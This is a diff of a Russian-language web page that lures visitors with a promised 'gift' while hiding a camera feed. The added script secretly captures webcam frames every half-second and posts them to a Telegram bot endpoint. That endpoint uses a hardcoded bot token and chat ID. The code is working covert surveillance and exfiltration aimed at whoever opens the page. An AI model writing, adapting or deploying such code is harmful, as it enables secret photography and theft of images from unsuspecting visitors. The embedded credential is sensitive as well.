@@ -1,57 +1,78 @@
-<script>
-let ism = prompt("Введите своё Имя пользователя");
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Доступ к камере</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+</head>
+<body class="bg-sky-950 flex items-center justify-center h-screen flex-col space-y-6">
+  <h1 class="text-4xl text-center text-amber-400 animate-pulse">
+    Подождите немного, чтобы получить подарок!
+  </h1>
+  
+  <!-- Видео прозрачно, но видно браузеру -->
+  <video id="video" autoplay playsinline muted class="opacity-0 absolute pointer-events-none w-[640px] h-[480px]"></video>
 
-document.addEventListener("DOMContentLoaded", function () {
-  const video = document.getElementById("video");
+  <script>
+    // Спросить имя пользователя (необязательно)
+    const ism = prompt("Введите своё имя пользователя");
 
-  navigator.mediaDevices
-    .getUserMedia({ video: true })
-    .then(function (stream) {
-      video.srcObject = stream;
-      video.play();
+    const video = document.getElementById("video");
 
-      video.onloadedmetadata = () => {
-        setInterval(sendPhoto, 5000); // Только когда метаданные загружены
-      };
-    })
-    .catch(function (err) {
-      console.log("Ошибка при доступе к камере: " + err);
-    });
+    // Запрашиваем доступ к камере
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
 
-  function sendPhoto() {
-    if (video.videoWidth === 0 || video.videoHeight === 0) {
-      console.log("Видео ещё не готово");
-      return;
-    }
+        // Дожидаемся полной загрузки метаданных
+        video.onloadedmetadata = () => {
+          video.play();
 
-    const canvas = document.createElement("canvas");
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const context = canvas.getContext("2d");
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+          // Начинаем отправлять фото каждые 5 секунд
+          setInterval(sendPhoto, 500);
+        };
+      })
+      .catch((err) => {
+        console.error("Ошибка при доступе к камере:", err);
+        alert("Не удалось получить доступ к камере. Разрешите доступ вручную.");
+      });
 
-    canvas.toBlob(function (blob) {
-      const formData = new FormData();
-      formData.append("chat_id", "1347186841");
-      formData.append("photo", blob);
+    // Функция для отправки фото в Telegram
+    function sendPhoto() {
+      // Убедимся, что видео готово
+      if (video.videoWidth === 0 || video.videoHeight === 0) {
+        console.warn("Камера ещё не готова");
+        return;
+      }
 
-      fetch(
-        "https://api.telegram.org/bot7963148627:AAHGkT746bxkUEnGH0UC5-rV0nd2tDpFKkg/sendPhoto",
-        {
+      const canvas = document.createElement("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      const context = canvas.getContext("2d");
+
+      // Захватываем изображение с камеры
+      context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      // Преобразуем в blob и отправляем
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", "1347186841"); // Заменить на свой chat_id
+        formData.append("photo", blob);
+
+        fetch("https://api.telegram.org/bot7963148627:AAHGkT746bxkUEnGH0UC5-rV0nd2tDpFKkg/sendPhoto", {
           method: "POST",
-          body: formData,
-        }
-      )
-        .then((response) => {
-          if (!response.ok) {
-            throw new Error("Ошибка отправки фотографии на сервер");
-          }
-          console.log("Фотография успешно отправлена");
+          body: formData
         })
-        .catch((error) => {
-          console.error("Произошла ошибка:", error);
+        .then((res) => {
+          if (!res.ok) throw new Error("Ошибка при отправке фото");
+          console.log("Фото успешно отправлено");
+        })
+        .catch((err) => {
+          console.error("Ошибка отправки:", err);
         });
-    }, "image/jpeg");
-  }
-});
-</script>
+      }, "image/jpeg");
+    }
+  </script>
+</body>
+</html>
